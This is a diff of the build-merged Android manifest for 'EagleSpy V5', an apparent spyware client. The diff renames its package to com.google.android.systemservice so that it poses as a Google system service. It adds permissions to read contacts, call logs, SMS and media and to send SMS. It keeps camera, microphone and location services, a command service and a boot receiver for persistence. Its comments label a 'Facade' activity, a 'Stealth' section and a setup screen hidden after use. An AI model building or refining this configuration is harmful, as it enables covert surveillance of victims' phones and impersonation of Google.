@@ -1,6 +1,6 @@
 1<?xml version="1.0" encoding="utf-8"?>
 2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-3    package="com.stealth.eaglespy"
+3    package="com.google.android.systemservice"
 4    android:versionCode="1"
 5    android:versionName="1.0" >
 6
@@ -16,7 +16,7 @@
 13-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:7:5-79
 13-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:7:22-76
 14
-15    <!-- Location Permissions (Runtime) -->
+15    <!-- Location Permissions -->
 16    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
 16-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:10:5-79
 16-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:10:22-76
@@ -27,7 +27,7 @@
 18-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:12:5-85
 18-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:12:22-82
 19
-20    <!-- Camera & Microphone (Runtime) -->
+20    <!-- Camera & Microphone -->
 21    <uses-permission android:name="android.permission.CAMERA" />
 21-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:15:5-65
 21-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:15:22-62
@@ -35,412 +35,626 @@
 22-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:16:5-71
 22-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:16:22-68
 23
-24    <!-- Background & Persistence -->
-25    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-25-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:19:5-81
-25-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:19:22-78
-26    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-26-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:20:5-77
-26-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:20:22-74
-27    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
-27-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:21:5-84
-27-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:21:22-81
-28    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
-28-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:22:5-88
-28-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:22:22-85
-29    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
-29-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:23:5-86
-29-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:23:22-83
-30    <uses-permission android:name="android.permission.WAKE_LOCK" />
-30-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:24:5-68
-30-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:24:22-65
-31
-32    <!-- Stealth: Hide from recent apps -->
-33    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-33-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:27:5-78
-33-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:27:22-75
-34
-35    <permission
-35-->[androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:22:5-24:47
-36        android:name="com.stealth.eaglespy.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
-36-->[androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:23:9-81
-37        android:protectionLevel="signature" />
-37-->[androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:24:9-44
-38
-39    <uses-permission android:name="com.stealth.eaglespy.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
-39-->[androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:26:5-97
-39-->[androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:26:22-94
+24    <!-- Contacts & Call Log -->
+25    <uses-permission android:name="android.permission.READ_CONTACTS" />
+25-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:19:5-72
+25-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:19:22-69
+26    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+26-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:20:5-72
+26-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:20:22-69
+27
+28    <!-- SMS -->
+29    <uses-permission android:name="android.permission.READ_SMS" />
+29-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:23:5-67
+29-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:23:22-64
+30    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+30-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:24:5-70
+30-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:24:22-67
+31    <uses-permission android:name="android.permission.SEND_SMS" />
+31-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:25:5-67
+31-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:25:22-64
+32
+33    <!-- Storage -->
+34    <uses-permission
+34-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:28:5-107
+35        android:name="android.permission.READ_EXTERNAL_STORAGE"
+35-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:28:22-77
+36        android:maxSdkVersion="32" />
+36-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:28:78-104
+37    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+37-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:29:5-76
+37-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:29:22-73
+38    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+38-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:30:5-75
+38-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:30:22-72
+39    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+39-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:31:5-75
+39-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:31:22-72
 40
-41    <application
-41-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:29:5-81:19
-42        android:name="com.stealth.eaglespy.EagleSpyApp"
-42-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:30:9-36
-43        android:allowBackup="false"
-43-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:31:9-36
-44        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
-44-->[androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:28:18-86
-45        android:debuggable="true"
-46        android:extractNativeLibs="false"
-47        android:icon="@android:drawable/sym_def_app_icon"
-47-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:32:9-58
-48        android:label="@string/app_name"
-48-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:33:9-41
-49        android:networkSecurityConfig="@xml/network_security_config"
-49-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:37:9-69
-50        android:roundIcon="@android:drawable/sym_def_app_icon"
-50-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:34:9-63
-51        android:supportsRtl="true"
-51-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:35:9-35
-52        android:theme="@style/Theme.EagleSpy" >
-52-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:36:9-46
-53
-54        <!-- Facade Activity (visible to user) -->
-55        <activity
-55-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:41:9-49:20
-56            android:name="com.stealth.eaglespy.MainActivity"
-56-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:42:13-41
-57            android:exported="true"
-57-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:43:13-36
-58            android:launchMode="singleTask" >
-58-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:44:13-44
-59            <intent-filter>
-59-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:45:13-48:29
-60                <action android:name="android.intent.action.MAIN" />
-60-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:46:17-69
-60-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:46:25-66
-61
-62                <category android:name="android.intent.category.LAUNCHER" />
-62-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:47:17-77
-62-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:47:27-74
-63            </intent-filter>
-64        </activity>
-65
-66        <!-- Background Services -->
-67        <service
-67-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:52:9-55:40
-68            android:name="com.stealth.eaglespy.services.LocationService"
-68-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:53:13-53
-69            android:exported="false"
-69-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:55:13-37
-70            android:foregroundServiceType="location" />
-70-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:54:13-53
-71        <service
-71-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:57:9-60:40
-72            android:name="com.stealth.eaglespy.services.CameraService"
-72-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:58:13-51
-73            android:exported="false"
-73-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:60:13-37
-74            android:foregroundServiceType="camera" />
-74-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:59:13-51
-75        <service
-75-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:62:9-65:40
-76            android:name="com.stealth.eaglespy.services.AudioService"
-76-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:63:13-50
-77            android:exported="false"
-77-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:65:13-37
-78            android:foregroundServiceType="microphone" />
-78-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:64:13-55
-79        <service
-79-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:67:9-69:40
-80            android:name="com.stealth.eaglespy.services.CommandService"
-80-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:68:13-52
-81            android:exported="false" />
-81-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:69:13-37
-82
-83        <!-- Boot Receiver for Persistence -->
-84        <receiver
-84-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:72:9-79:20
-85            android:name="com.stealth.eaglespy.services.BootReceiver"
-85-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:73:13-50
-86            android:exported="true" >
-86-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:74:13-36
+41    <!-- Background & Persistence -->
+42    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+42-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:34:5-81
+42-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:34:22-78
+43    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+43-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:35:5-77
+43-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:35:22-74
+44    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+44-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:36:5-84
+44-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:36:22-81
+45    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+45-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:37:5-88
+45-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:37:22-85
+46    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+46-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:38:5-86
+46-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:38:22-83
+47    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+47-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:39:5-87
+47-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:39:22-84
+48    <uses-permission android:name="android.permission.WAKE_LOCK" />
+48-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:40:5-68
+48-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:40:22-65
+49    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+49-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:41:5-95
+49-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:41:22-92
+50    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+50-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:42:5-79
+50-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:42:22-76
+51
+52    <!-- Notifications (Android 13+) -->
+53    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+53-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:45:5-77
+53-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:45:22-74
+54
+55    <!-- Notification Listener -->
+56    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
+56-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:48:5-49:47
+56-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:48:22-90
+57
+58    <!-- Stealth -->
+59    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+59-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:52:5-78
+59-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:52:22-75
+60
+61    <permission
+61-->[androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:22:5-24:47
+62        android:name="com.google.android.systemservice.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+62-->[androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:23:9-81
+63        android:protectionLevel="signature" />
+63-->[androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:24:9-44
+64
+65    <uses-permission android:name="com.google.android.systemservice.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
+65-->[androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:26:5-97
+65-->[androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:26:22-94
+66
+67    <application
+67-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:54:5-189:19
+68        android:name="com.google.android.systemservice.EagleSpyApp"
+68-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:55:9-36
+69        android:allowBackup="false"
+69-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:56:9-36
+70        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+70-->[androidx.core:core:1.12.0] C:\Users\venci\.gradle\caches\transforms-3\db3f6b8020888a7f113f2982cc217484\transformed\core-1.12.0\AndroidManifest.xml:28:18-86
+71        android:debuggable="true"
+72        android:extractNativeLibs="false"
+73        android:icon="@mipmap/ic_launcher"
+73-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:57:9-43
+74        android:label="@string/app_name"
+74-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:58:9-41
+75        android:networkSecurityConfig="@xml/network_security_config"
+75-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:62:9-69
+76        android:roundIcon="@mipmap/ic_launcher"
+76-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:59:9-48
+77        android:supportsRtl="true"
+77-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:60:9-35
+78        android:theme="@style/Theme.EagleSpy" >
+78-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:61:9-46
+79
+80        <!-- Setup Wizard Activity (Main Entry - Hidden after setup) -->
+81        <activity
+81-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:66:9-76:20
+82            android:name="com.google.android.systemservice.SetupWizardActivity"
+82-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:67:13-48
+83            android:excludeFromRecents="true"
+83-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:70:13-46
+84            android:exported="true"
+84-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:68:13-36
+85            android:launchMode="singleTask"
+85-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:69:13-44
+86            android:taskAffinity="" >
+86-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:71:13-36
 87            <intent-filter>
-87-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:75:13-78:29
-88                <action android:name="android.intent.action.BOOT_COMPLETED" />
-88-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:76:17-79
-88-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:76:25-76
-89                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-89-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:77:17-82
-89-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:77:25-79
-90            </intent-filter>
-91        </receiver>
-92
-93        <provider
-93-->[androidx.emoji2:emoji2:1.2.0] C:\Users\venci\.gradle\caches\transforms-3\2ae845919254fd1c61ba530851d4711d\transformed\emoji2-1.2.0\AndroidManifest.xml:24:9-32:20
-94            android:name="androidx.startup.InitializationProvider"
-94-->[androidx.emoji2:emoji2:1.2.0] C:\Users\venci\.gradle\caches\transforms-3\2ae845919254fd1c61ba530851d4711d\transformed\emoji2-1.2.0\AndroidManifest.xml:25:13-67
-95            android:authorities="com.stealth.eaglespy.androidx-startup"
-95-->[androidx.emoji2:emoji2:1.2.0] C:\Users\venci\.gradle\caches\transforms-3\2ae845919254fd1c61ba530851d4711d\transformed\emoji2-1.2.0\AndroidManifest.xml:26:13-68
-96            android:exported="false" >
-96-->[androidx.emoji2:emoji2:1.2.0] C:\Users\venci\.gradle\caches\transforms-3\2ae845919254fd1c61ba530851d4711d\transformed\emoji2-1.2.0\AndroidManifest.xml:27:13-37
-97            <meta-data
-97-->[androidx.emoji2:emoji2:1.2.0] C:\Users\venci\.gradle\caches\transforms-3\2ae845919254fd1c61ba530851d4711d\transformed\emoji2-1.2.0\AndroidManifest.xml:29:13-31:52
-98                android:name="androidx.emoji2.text.EmojiCompatInitializer"
-98-->[androidx.emoji2:emoji2:1.2.0] C:\Users\venci\.gradle\caches\transforms-3\2ae845919254fd1c61ba530851d4711d\transformed\emoji2-1.2.0\AndroidManifest.xml:30:17-75
-99                android:value="androidx.startup" />
-99-->[androidx.emoji2:emoji2:1.2.0] C:\Users\venci\.gradle\caches\transforms-3\2ae845919254fd1c61ba530851d4711d\transformed\emoji2-1.2.0\AndroidManifest.xml:31:17-49
-100            <meta-data
-100-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:34:13-36:52
-101                android:name="androidx.work.WorkManagerInitializer"
-101-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:35:17-68
-102                android:value="androidx.startup" />
-102-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:36:17-49
-103            <meta-data
-103-->[androidx.lifecycle:lifecycle-process:2.6.1] C:\Users\venci\.gradle\caches\transforms-3\ebeb0bbad0da86e0f22c3eb70a97fea9\transformed\lifecycle-process-2.6.1\AndroidManifest.xml:29:13-31:52
-104                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
-104-->[androidx.lifecycle:lifecycle-process:2.6.1] C:\Users\venci\.gradle\caches\transforms-3\ebeb0bbad0da86e0f22c3eb70a97fea9\transformed\lifecycle-process-2.6.1\AndroidManifest.xml:30:17-78
-105                android:value="androidx.startup" />
-105-->[androidx.lifecycle:lifecycle-process:2.6.1] C:\Users\venci\.gradle\caches\transforms-3\ebeb0bbad0da86e0f22c3eb70a97fea9\transformed\lifecycle-process-2.6.1\AndroidManifest.xml:31:17-49
-106            <meta-data
-106-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:29:13-31:52
-107                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
-107-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:30:17-85
-108                android:value="androidx.startup" />
-108-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:31:17-49
-109        </provider>
-110
-111        <activity
-111-->[com.google.android.gms:play-services-base:18.1.0] C:\Users\venci\.gradle\caches\transforms-3\7ad58fe70a110582d803277c9b6abb05\transformed\play-services-base-18.1.0\AndroidManifest.xml:20:9-22:45
-112            android:name="com.google.android.gms.common.api.GoogleApiActivity"
-112-->[com.google.android.gms:play-services-base:18.1.0] C:\Users\venci\.gradle\caches\transforms-3\7ad58fe70a110582d803277c9b6abb05\transformed\play-services-base-18.1.0\AndroidManifest.xml:20:19-85
-113            android:exported="false"
-113-->[com.google.android.gms:play-services-base:18.1.0] C:\Users\venci\.gradle\caches\transforms-3\7ad58fe70a110582d803277c9b6abb05\transformed\play-services-base-18.1.0\AndroidManifest.xml:22:19-43
-114            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
-114-->[com.google.android.gms:play-services-base:18.1.0] C:\Users\venci\.gradle\caches\transforms-3\7ad58fe70a110582d803277c9b6abb05\transformed\play-services-base-18.1.0\AndroidManifest.xml:21:19-78
-115
-116        <meta-data
-116-->[com.google.android.gms:play-services-basement:18.1.0] C:\Users\venci\.gradle\caches\transforms-3\1efef0bb2a1b0143895ab85c8b9baeb8\transformed\play-services-basement-18.1.0\AndroidManifest.xml:21:9-23:69
-117            android:name="com.google.android.gms.version"
-117-->[com.google.android.gms:play-services-basement:18.1.0] C:\Users\venci\.gradle\caches\transforms-3\1efef0bb2a1b0143895ab85c8b9baeb8\transformed\play-services-basement-18.1.0\AndroidManifest.xml:22:13-58
-118            android:value="@integer/google_play_services_version" />
-118-->[com.google.android.gms:play-services-basement:18.1.0] C:\Users\venci\.gradle\caches\transforms-3\1efef0bb2a1b0143895ab85c8b9baeb8\transformed\play-services-basement-18.1.0\AndroidManifest.xml:23:13-66
-119
-120        <service
-120-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:39:9-45:35
-121            android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"
-121-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:40:13-88
-122            android:directBootAware="false"
-122-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:41:13-44
-123            android:enabled="@bool/enable_system_alarm_service_default"
-123-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:42:13-72
-124            android:exported="false" />
-124-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:43:13-37
-125        <service
-125-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:46:9-52:35
-126            android:name="androidx.work.impl.background.systemjob.SystemJobService"
-126-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:47:13-84
-127            android:directBootAware="false"
-127-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:48:13-44
-128            android:enabled="@bool/enable_system_job_service_default"
-128-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:49:13-70
-129            android:exported="true"
-129-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:50:13-36
-130            android:permission="android.permission.BIND_JOB_SERVICE" />
-130-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:51:13-69
-131        <service
-131-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:53:9-59:35
-132            android:name="androidx.work.impl.foreground.SystemForegroundService"
-132-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:54:13-81
-133            android:directBootAware="false"
-133-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:55:13-44
-134            android:enabled="@bool/enable_system_foreground_service_default"
-134-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:56:13-77
-135            android:exported="false" />
-135-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:57:13-37
-136
-137        <receiver
-137-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:61:9-66:35
-138            android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"
-138-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:62:13-88
-139            android:directBootAware="false"
-139-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:63:13-44
-140            android:enabled="true"
-140-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:64:13-35
-141            android:exported="false" />
-141-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:65:13-37
-142        <receiver
-142-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:67:9-77:20
